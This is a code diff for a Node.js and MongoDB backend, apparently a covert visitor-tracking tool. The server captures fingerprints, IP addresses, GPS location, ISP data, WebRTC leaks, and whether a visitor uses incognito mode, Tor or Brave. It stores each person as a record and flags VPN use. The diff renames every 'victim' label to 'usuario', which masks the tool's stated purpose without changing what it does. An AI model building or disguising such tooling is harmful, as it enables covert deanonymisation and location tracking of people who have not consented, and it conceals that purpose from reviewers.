@@ -31,7 +31,7 @@ const client = new MongoClient(uri, {
   w: 'majority'
 });
 
-let victimsCollection;
+let usuariosCollection;
 
 // ═══════════════════════════════════════
 // 🗄️ CACHE SYSTEM PARA GEOLOCALIZACIÓN
@@ -75,11 +75,11 @@ async function connectDB() {
     console.log("✅ Conectado a MongoDB Atlas");
     
     const db = client.db('apex-db');
-    victimsCollection = db.collection('victims');
-    
+    usuariosCollection = db.collection('usuarios');
+
     // Crear índices
-    await victimsCollection.createIndex({ fingerprint: 1 }, { unique: true });
-    await victimsCollection.createIndex({ timestamp: -1 });
+    await usuariosCollection.createIndex({ fingerprint: 1 }, { unique: true });
+    await usuariosCollection.createIndex({ timestamp: -1 });
     console.log("📊 Índices creados en MongoDB");
     
   } catch (error) {
@@ -339,11 +339,11 @@ async function getLocationFromCoordinates(lat, lon) {
     }
 }
 
-// Verificar si la víctima ya fue capturada
+// Verificar si el usuario ya fue capturado
 async function isAlreadyCaptured(fingerprint) {
   try {
     if (!fingerprint) return false;
-    const count = await victimsCollection.countDocuments({ fingerprint });
+    const count = await usuariosCollection.countDocuments({ fingerprint });
     return count > 0;
   } catch (error) {
     console.error("Error verificando duplicado:", error);
@@ -351,67 +351,67 @@ async function isAlreadyCaptured(fingerprint) {
   }
 }
 
-// Guardar víctima en MongoDB (FIXED VERSION)
-async function saveVictim(victimData) {
+// Guardar usuario en MongoDB (FIXED VERSION)
+async function saveUsuario(usuarioData) {
   try {
     // Validación
-    if (!victimData || typeof victimData !== 'object') {
-      console.error("❌ Invalid victim data");
+    if (!usuarioData || typeof usuarioData !== 'object') {
+      console.error("❌ Invalid usuario data");
       return false;
     }
 
-    if (!victimData.fingerprint || typeof victimData.fingerprint !== 'string') {
+    if (!usuarioData.fingerprint || typeof usuarioData.fingerprint !== 'string') {
       console.error("❌ Missing or invalid fingerprint");
       return false;
     }
 
     // ✅ FIX: Store values in local variables BEFORE any MongoDB operations
-    const fingerprint = victimData.fingerprint;
-    const username = victimData.username || 'Unknown';
-    const ip = victimData.network?.ip || 'Unknown';
-    const city = victimData.network?.city || 'Unknown';
-    const country = victimData.network?.country || 'Unknown';
-    const isp = victimData.network?.isp || 'Unknown';
+    const fingerprint = usuarioData.fingerprint;
+    const username = usuarioData.username || 'Unknown';
+    const ip = usuarioData.network?.ip || 'Unknown';
+    const city = usuarioData.network?.city || 'Unknown';
+    const country = usuarioData.network?.country || 'Unknown';
+    const isp = usuarioData.network?.isp || 'Unknown';
 
-    victimData.timestamp = new Date();
-    await victimsCollection.insertOne(victimData);
+    usuarioData.timestamp = new Date();
+    await usuariosCollection.insertOne(usuarioData);
 
-    // ✅ FIX: Use local variables instead of victimData properties
+    // ✅ FIX: Use local variables instead of usuarioData properties
     const fingerprintPreview = fingerprint.substring(0, 8);
 
     // Badges especiales
     let badges = [];
-    if (victimData.incognitoMode?.isIncognito) badges.push('🕵️ INCÓGNITO');
-    if (victimData.privacyBrowser?.isTor) badges.push('🧅 TOR');
-    if (victimData.privacyBrowser?.isDuckDuckGo) badges.push('🦆 DDG');
-    if (victimData.privacyBrowser?.isBrave) badges.push('🦁 BRAVE');
-    if (victimData.device?.isMobile) badges.push('📱 MÓVIL');
-    if (victimData.device?.isBot) badges.push('🤖 BOT');
+    if (usuarioData.incognitoMode?.isIncognito) badges.push('🕵️ INCÓGNITO');
+    if (usuarioData.privacyBrowser?.isTor) badges.push('🧅 TOR');
+    if (usuarioData.privacyBrowser?.isDuckDuckGo) badges.push('🦆 DDG');
+    if (usuarioData.privacyBrowser?.isBrave) badges.push('🦁 BRAVE');
+    if (usuarioData.device?.isMobile) badges.push('📱 MÓVIL');
+    if (usuarioData.device?.isBot) badges.push('🤖 BOT');
 
     const badgeStr = badges.length > 0 ? ` [${badges.join(' ')}]` : '';
 
-    console.log(`🎯 Nueva víctima capturada: ${username} [${fingerprintPreview}...]${badgeStr}`);
+    console.log(`🎯 Nuevo usuario capturado: ${username} [${fingerprintPreview}...]${badgeStr}`);
     console.log(`   🌐 ${ip} | ${city}, ${country} | ISP: ${isp}`);
     return true;
-    
+
   } catch (error) {
     if (error.code === 11000) {
       // ✅ Already had safe optional chaining here
-      const fingerprintPreview = victimData.fingerprint?.substring(0, 8) || 'Unknown';
-      console.log(`⚠️ Víctima duplicada ignorada: ${fingerprintPreview}...`);
+      const fingerprintPreview = usuarioData.fingerprint?.substring(0, 8) || 'Unknown';
+      console.log(`⚠️ Usuario duplicado ignorado: ${fingerprintPreview}...`);
       return false;
     }
-    console.error("Error guardando víctima:", error);
+    console.error("Error guardando usuario:", error);
     return false;
   }
 }
 
-// Obtener todas las víctimas
-async function getVictims() {
+// Obtener todos los usuarios
+async function getUsuarios() {
   try {
-    return await victimsCollection.find({}).sort({ timestamp: -1 }).toArray();
+    return await usuariosCollection.find({}).sort({ timestamp: -1 }).toArray();
   } catch (error) {
-    console.error("Error obteniendo víctimas:", error);
+    console.error("Error obteniendo usuarios:", error);
     return [];
   }
 }
@@ -430,7 +430,7 @@ app.get('/', (req, res) => {
   });
 });
 
-// Capturar datos de víctima
+// Capturar datos de usuario
 app.post('/api/capture', async (req, res) => {
   try {
     const data = req.body;
@@ -705,18 +705,18 @@ app.post('/api/capture', async (req, res) => {
     }
 
     // Guardar en MongoDB
-    const saved = await saveVictim(data);
-    
+    const saved = await saveUsuario(data);
+
     if (saved) {
-      res.json({ 
-        success: true, 
+      res.json({
+        success: true,
         message: 'Data captured successfully',
-        victimId: data.fingerprint.substring(0, 8)
+        usuarioId: data.fingerprint.substring(0, 8)
       });
     } else {
-      res.json({ 
-        success: false, 
-        message: 'Failed to save data' 
+      res.json({
+        success: false,
+        message: 'Failed to save data'
       });
     }
 
@@ -733,16 +733,16 @@ app.post('/api/capture', async (req, res) => {
 // Obtener estadísticas
 app.get('/api/stats', async (req, res) => {
   try {
-    const victims = await getVictims();
-    
+    const usuarios = await getUsuarios();
+
     const stats = {
-      totalVictims: victims.length,
-      lastCapture: victims.length > 0 ? victims[0].timestamp : null,
-      uniqueCountries: [...new Set(victims.map(v => v.network?.country).filter(Boolean))].length,
+      totalUsuarios: usuarios.length,
+      lastCapture: usuarios.length > 0 ? usuarios[0].timestamp : null,
+      uniqueCountries: [...new Set(usuarios.map(v => v.network?.country).filter(Boolean))].length,
       browsers: {},
       operatingSystems: {},
       devices: {},
-      recentVictims: victims.slice(0, 5).map(v => ({
+      recentUsuarios: usuarios.slice(0, 5).map(v => ({
         username: v.username || 'Unknown',
         timestamp: v.timestamp,
         country: v.network?.country || 'Unknown',
@@ -752,19 +752,19 @@ app.get('/api/stats', async (req, res) => {
     };
 
     // Contar browsers
-    victims.forEach(v => {
+    usuarios.forEach(v => {
       const browser = v.browser?.name || 'Unknown';
       stats.browsers[browser] = (stats.browsers[browser] || 0) + 1;
     });
 
     // Contar OS
-    victims.forEach(v => {
+    usuarios.forEach(v => {
       const os = v.os?.name || 'Unknown';
       stats.operatingSystems[os] = (stats.operatingSystems[os] || 0) + 1;
     });
 
     // Contar dispositivos
-    victims.forEach(v => {
+    usuarios.forEach(v => {
       const device = v.device?.type || 'Unknown';
       stats.devices[device] = (stats.devices[device] || 0) + 1;
     });
@@ -776,25 +776,25 @@ app.get('/api/stats', async (req, res) => {
   }
 });
 
-// Obtener todas las víctimas
-app.get('/api/victims', async (req, res) => {
+// Obtener todos los usuarios
+app.get('/api/usuarios', async (req, res) => {
   try {
-    const victims = await getVictims();
-    res.json(victims);
+    const usuarios = await getUsuarios();
+    res.json(usuarios);
   } catch (error) {
-    console.error('Error en /api/victims:', error);
+    console.error('Error en /api/usuarios:', error);
     res.status(500).json({ error: 'Internal server error' });
   }
 });
 
-// Limpiar todas las víctimas (para testing)
+// Limpiar todos los usuarios (para testing)
 app.delete('/api/clear', async (req, res) => {
   try {
-    const result = await victimsCollection.deleteMany({});
-    console.log(`🗑️ Base de datos limpiada: ${result.deletedCount} víctimas eliminadas`);
+    const result = await usuariosCollection.deleteMany({});
+    console.log(`🗑️ Base de datos limpiada: ${result.deletedCount} usuarios eliminados`);
     res.json({
       success: true,
-      message: `${result.deletedCount} victims cleared`,
+      message: `${result.deletedCount} usuarios cleared`,
       deletedCount: result.deletedCount
     });
   } catch (error) {
@@ -806,13 +806,13 @@ app.delete('/api/clear', async (req, res) => {
   }
 });
 
-// ✅ RE-PROCESAR VÍCTIMAS CON UBICACIÓN UNKNOWN
+// ✅ RE-PROCESAR USUARIOS CON UBICACIÓN UNKNOWN
 app.post('/api/reprocess-locations', async (req, res) => {
   try {
     console.log('🔄 Re-procesando ubicaciones Unknown...');
 
-    // Buscar víctimas con ubicación Unknown
-    const victimsWithUnknownLocation = await victimsCollection.find({
+    // Buscar usuarios con ubicación Unknown
+    const usuariosWithUnknownLocation = await usuariosCollection.find({
       $or: [
         { 'network.city': 'Unknown' },
         { 'network.country': 'Unknown' },
@@ -821,32 +821,32 @@ app.post('/api/reprocess-locations', async (req, res) => {
       ]
     }).toArray();
 
-    console.log(`📊 Encontradas ${victimsWithUnknownLocation.length} víctimas con ubicación Unknown`);
+    console.log(`📊 Encontrados ${usuariosWithUnknownLocation.length} usuarios con ubicación Unknown`);
 
     let updated = 0;
     let failed = 0;
     let skipped = 0;
 
-    for (const victim of victimsWithUnknownLocation) {
+    for (const usuario of usuariosWithUnknownLocation) {
       try {
         let newGeo = null;
         let locationSource = 'unknown';
 
         // 1. Intentar con GPS si está disponible
-        if (victim.geolocation?.latitude && victim.geolocation?.longitude) {
-          console.log(`🌍 Víctima ${victim._id}: Intentando GPS...`);
+        if (usuario.geolocation?.latitude && usuario.geolocation?.longitude) {
+          console.log(`🌍 Usuario ${usuario._id}: Intentando GPS...`);
 
           const gpsLocation = await getLocationFromCoordinates(
-            victim.geolocation.latitude,
-            victim.geolocation.longitude
+            usuario.geolocation.latitude,
+            usuario.geolocation.longitude
           );
 
           if (gpsLocation && (gpsLocation.city || gpsLocation.country)) {
             // Obtener IP info
-            const ipInfo = await getLocationFromIP(victim.network?.ip || '8.8.8.8');
+            const ipInfo = await getLocationFromIP(usuario.network?.ip || '8.8.8.8');
 
             newGeo = {
-              ip: victim.network?.ip || 'Unknown',
+              ip: usuario.network?.ip || 'Unknown',
               isp: ipInfo.isp,
               timezone: ipInfo.timezone,
               ...gpsLocation,
@@ -858,10 +858,10 @@ app.post('/api/reprocess-locations', async (req, res) => {
         }
 
         // 2. Si GPS falló o no está disponible, intentar con IP
-        if (!newGeo && victim.network?.ip) {
-          console.log(`🌐 Víctima ${victim._id}: Intentando IP (${victim.network.ip})...`);
+        if (!newGeo && usuario.network?.ip) {
+          console.log(`🌐 Usuario ${usuario._id}: Intentando IP (${usuario.network.ip})...`);
 
-          const ipLocation = await getLocationFromIP(victim.network.ip);
+          const ipLocation = await getLocationFromIP(usuario.network.ip);
 
           if (ipLocation && (ipLocation.city || ipLocation.country)) {
             newGeo = ipLocation;
@@ -880,13 +880,13 @@ app.post('/api/reprocess-locations', async (req, res) => {
             'network.latitude': newGeo.latitude || null,
             'network.longitude': newGeo.longitude || null,
             'network.timezone': newGeo.timezone || 'Unknown',
-            'network.isp': newGeo.isp || victim.network?.isp || 'Unknown',
+            'network.isp': newGeo.isp || usuario.network?.isp || 'Unknown',
             'network.postal': newGeo.postal || 'Unknown',
             'network.locationSource': locationSource
           };
 
-          await victimsCollection.updateOne(
-            { _id: victim._id },
+          await usuariosCollection.updateOne(
+            { _id: usuario._id },
             { $set: updates }
           );
 
@@ -901,13 +901,13 @@ app.post('/api/reprocess-locations', async (req, res) => {
         await new Promise(resolve => setTimeout(resolve, 1000));
 
       } catch (error) {
-        console.error(`   ❌ Error procesando víctima ${victim._id}:`, error.message);
+        console.error(`   ❌ Error procesando usuario ${usuario._id}:`, error.message);
         failed++;
       }
     }
 
     console.log(`✅ Re-procesamiento completado:`);
-    console.log(`   📊 Total: ${victimsWithUnknownLocation.length}`);
+    console.log(`   📊 Total: ${usuariosWithUnknownLocation.length}`);
     console.log(`   ✅ Actualizados: ${updated}`);
     console.log(`   ⏭️ Omitidos: ${skipped}`);
     console.log(`   ❌ Errores: ${failed}`);
@@ -915,7 +915,7 @@ app.post('/api/reprocess-locations', async (req, res) => {
     res.json({
       success: true,
       message: 'Location reprocessing completed',
-      total: victimsWithUnknownLocation.length,
+      total: usuariosWithUnknownLocation.length,
       updated: updated,
       skipped: skipped,
       failed: failed
@@ -936,18 +936,18 @@ app.post('/api/migrate', async (req, res) => {
   try {
     console.log('🔄 Iniciando migración de datos...');
 
-    const allVictims = await victimsCollection.find({}).toArray();
+    const allUsuarios = await usuariosCollection.find({}).toArray();
     let updated = 0;
     let errors = 0;
 
-    for (const victim of allVictims) {
+    for (const usuario of allUsuarios) {
       try {
         const updates = {};
         let needsUpdate = false;
 
         // 1. Asegurar que device.type existe
-        if (!victim.device?.type) {
-          const ua = victim.browser?.userAgent || '';
+        if (!usuario.device?.type) {
+          const ua = usuario.browser?.userAgent || '';
           const isMobile = /mobile|android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua);
           const isTablet = /tablet|ipad|playbook|silk/i.test(ua);
 
@@ -959,15 +959,15 @@ app.post('/api/migrate', async (req, res) => {
         }
 
         // 2. Detectar bots si no existe
-        if (victim.device?.isBot === undefined) {
-          const ua = victim.browser?.userAgent || '';
+        if (usuario.device?.isBot === undefined) {
+          const ua = usuario.browser?.userAgent || '';
           const botPatterns = /bot|crawler|spider|crawling|slurp|baidu|bing|google|yahoo/i;
           updates['device.isBot'] = botPatterns.test(ua);
           needsUpdate = true;
         }
 
         // 3. Re-evaluar VPN detection si está desactualizado o mal configurado
-        if (!victim.network?.vpnDetection || !victim.network.vpnDetection.confidence) {
+        if (!usuario.network?.vpnDetection || !usuario.network.vpnDetection.confidence) {
           const vpnDetection = {
             timezoneMismatch: false,
             webRTCLeak: false,
@@ -977,23 +977,23 @@ app.post('/api/migrate', async (req, res) => {
           };
 
           // Timezone mismatch
-          if (victim.timezoneInfo?.timezone && victim.network?.timezone &&
-              victim.network.timezone !== 'Unknown' && victim.network.timezone !== 'UTC') {
-            if (victim.timezoneInfo.timezone !== victim.network.timezone &&
-                victim.timezoneInfo.timezone !== 'UTC') {
+          if (usuario.timezoneInfo?.timezone && usuario.network?.timezone &&
+              usuario.network.timezone !== 'Unknown' && usuario.network.timezone !== 'UTC') {
+            if (usuario.timezoneInfo.timezone !== usuario.network.timezone &&
+                usuario.timezoneInfo.timezone !== 'UTC') {
               vpnDetection.timezoneMismatch = true;
               vpnDetection.confidence = 'high';
             }
           }
 
           // WebRTC leak
-          const clientIP = victim.network?.ip;
-          if (victim.webRTC?.publicIP &&
-              victim.webRTC.publicIP !== 'Unknown' &&
-              victim.webRTC.publicIP !== 'Error' &&
-              victim.webRTC.publicIP !== clientIP &&
-              !victim.webRTC.publicIP.startsWith('192.168') &&
-              !victim.webRTC.publicIP.startsWith('10.')) {
+          const clientIP = usuario.network?.ip;
+          if (usuario.webRTC?.publicIP &&
+              usuario.webRTC.publicIP !== 'Unknown' &&
+              usuario.webRTC.publicIP !== 'Error' &&
+              usuario.webRTC.publicIP !== clientIP &&
+              !usuario.webRTC.publicIP.startsWith('192.168') &&
+              !usuario.webRTC.publicIP.startsWith('10.')) {
             vpnDetection.webRTCLeak = true;
             vpnDetection.confidence = 'high';
           }
@@ -1005,8 +1005,8 @@ app.post('/api/migrate', async (req, res) => {
             'hosting', 'cloudflare', 'akamai'
           ];
 
-          if (victim.network?.isp && typeof victim.network.isp === 'string') {
-            const ispLower = victim.network.isp.toLowerCase();
+          if (usuario.network?.isp && typeof usuario.network.isp === 'string') {
+            const ispLower = usuario.network.isp.toLowerCase();
             if (vpnISPs.some(vpn => ispLower.includes(vpn))) {
               vpnDetection.suspiciousISP = true;
               if (vpnDetection.confidence === 'low') vpnDetection.confidence = 'medium';
@@ -1030,15 +1030,15 @@ app.post('/api/migrate', async (req, res) => {
         }
 
         // 4. Agregar behavior.touches y swipes si no existen
-        if (victim.behavior && !victim.behavior.touches) {
+        if (usuario.behavior && !usuario.behavior.touches) {
           updates['behavior.touches'] = 0;
           updates['behavior.swipes'] = 0;
           needsUpdate = true;
         }
 
         // 5. Agregar locationSource si no existe
-        if (victim.network && !victim.network.locationSource) {
-          if (victim.geolocation?.latitude && victim.geolocation?.longitude) {
+        if (usuario.network && !usuario.network.locationSource) {
+          if (usuario.geolocation?.latitude && usuario.geolocation?.longitude) {
             updates['network.locationSource'] = 'gps';
           } else {
             updates['network.locationSource'] = 'ipapi';
@@ -1048,15 +1048,15 @@ app.post('/api/migrate', async (req, res) => {
 
         // Aplicar actualizaciones si hay cambios
         if (needsUpdate) {
-          await victimsCollection.updateOne(
-            { _id: victim._id },
+          await usuariosCollection.updateOne(
+            { _id: usuario._id },
             { $set: updates }
           );
           updated++;
         }
 
       } catch (error) {
-        console.error(`Error migrando victim ${victim._id}:`, error);
+        console.error(`Error migrando usuario ${usuario._id}:`, error);
         errors++;
       }
     }
@@ -1066,10 +1066,10 @@ app.post('/api/migrate', async (req, res) => {
     res.json({
       success: true,
       message: 'Migration completed',
-      totalRecords: allVictims.length,
+      totalRecords: allUsuarios.length,
       updated: updated,
       errors: errors,
-      unchanged: allVictims.length - updated - errors
+      unchanged: allUsuarios.length - updated - errors
     });
 
   } catch (error) {
